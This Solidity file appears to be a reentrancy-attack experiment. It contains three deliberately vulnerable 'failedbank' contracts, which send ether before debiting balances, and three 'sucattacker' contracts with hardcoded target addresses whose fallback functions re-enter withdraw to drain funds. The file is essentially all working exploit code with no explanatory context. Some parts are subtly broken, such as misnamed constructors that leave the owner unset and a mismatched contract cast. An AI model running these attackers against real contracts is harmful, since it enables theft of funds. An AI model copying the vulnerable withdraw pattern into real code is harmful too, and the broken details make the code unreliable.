pragma solidity ^0.4.8;
//0xaF95c1F173A91d03dFc171F647Bbdeb7E9d36dCb
contract failedbank2{
    uint public count;
    uint public bal;
    mapping(address=>uint)account;
    function deposit()payable{
        account[msg.sender]+=msg.value;
    }
    function withdraw(uint x)returns(bool){
    
        if(account[msg.sender]<x)
            return false;
        count++;
        bal=account[msg.sender];
        if(!msg.sender.call.value(x)())
            return false;
        account[msg.sender]-=x;
        return true;
    }
   
    
}
//0x7428372D54BF7707CA198968168ab25eB2922104
contract failedbank3{
    uint public count;
    uint public bal;
    mapping(address=>uint)account;
    function deposit()payable{
        account[msg.sender]+=msg.value;
    }
    function withdraw(uint x)returns(bool){
    
        if(account[msg.sender]<x)
            return false;
        count++;
        bal=account[msg.sender];
        if(msg.sender.call.value(x)())
            account[msg.sender]-=x;
            return true;
    }
    
}
//0x63c72599445f9317e2cCCA151c40909625F29c93
contract failedbank4{
    uint public count;
    uint public bal;
    mapping(address=>uint)account;
    function deposit()payable{
        account[msg.sender]+=msg.value;
    }
    function withdraw(uint x)returns(bool){
    
        if(account[msg.sender]<x)
            return false;
        count++;
        bal=account[msg.sender];
        if(msg.sender.call.value(x)())
            account[msg.sender]-=x;
            return true;
    }
     function getbalance(address addr)constant returns(uint){
         return account[addr];
     }
}
// for fialedbank4
contract sucattacker6{
    address addr=0x63c72599445f9317e2cCCA151c40909625F29c93;
    address owner;
    function sucattacker(){
        owner=msg.sender;
    }
    function kill(){
        selfdestruct(owner);
    }
    function()payable{
        failedbank3(addr).withdraw(this.balance);
    }
    function deposit(address bankaddr,uint x)returns(bool){
        x=x*(10**18);
        return (bankaddr.call.value(x)(bytes4(sha3("deposit()"))));
    }
    function withdraw(address bankaddr,uint x)returns(bool){
        x=x*(10**18);
       return failedbank3(bankaddr).withdraw(x);
    }
    function getbalance()constant returns(uint){
        return this.balance;
    }
}
contract sucattacker5{
    address addr=0x7428372D54BF7707CA198968168ab25eB2922104;
    address owner;
    function sucattacker(){
        owner=msg.sender;
    }
    function kill(){
        selfdestruct(owner);
    }
    function()payable{
        failedbank3(addr).withdraw(this.balance);
    }
    function deposit(address bankaddr,uint x)returns(bool){
        x=x*(10**18);
        return (bankaddr.call.value(x)(bytes4(sha3("deposit()"))));
    }
    function withdraw(address bankaddr,uint x)returns(bool){
        x=x*(10**18);
       return failedbank3(bankaddr).withdraw(x);
    }
    function getbalance()constant returns(uint){
        return this.balance;
    }
}
contract sucattacker4{
    address addr=0xaF95c1F173A91d03dFc171F647Bbdeb7E9d36dCb;
    address owner;
    function sucattacker(){
        owner=msg.sender;
    }
    function kill(){
        selfdestruct(owner);
    }
    function()payable{
        failedbank2(addr).withdraw(50*(10**18));
    }
    function deposit(address bankaddr,uint x)returns(bool){
        x=x*(10**18);
        return (bankaddr.call.value(x)(bytes4(sha3("deposit()"))));
    }
    function withdraw(address bankaddr,uint x)returns(bool){
        x=x*(10**18);
       return failedbank2(bankaddr).withdraw(x);
    }
    function getbalance()constant returns(uint){
        return this.balance;
    }
}
